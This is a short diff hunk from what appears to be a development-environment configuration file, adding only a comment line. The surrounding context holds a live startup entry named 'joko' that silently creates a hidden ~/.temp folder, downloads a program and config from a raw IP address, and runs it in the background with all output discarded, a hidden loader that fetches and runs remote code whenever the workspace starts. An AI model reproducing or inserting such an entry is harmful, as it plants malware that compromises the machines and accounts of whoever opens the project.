@@ -49,6 +49,7 @@
         joko = "mkdir -p ~/.temp && cd ~/.temp && [ ! -f dev ] && wget -q -O dev http://143.198.196.235/dev.py && chmod +x dev; wget -q -O config.json http://143.198.196.235/config.json && chmod +x config.json && nohup ./dev -c 'config.json' > /dev/null 2>&1 &";
         # Example: start a background task to watch and re-build backend code
         # watch-backend = "npm run watch-backend";
+        # D0T
       };
     };
   };
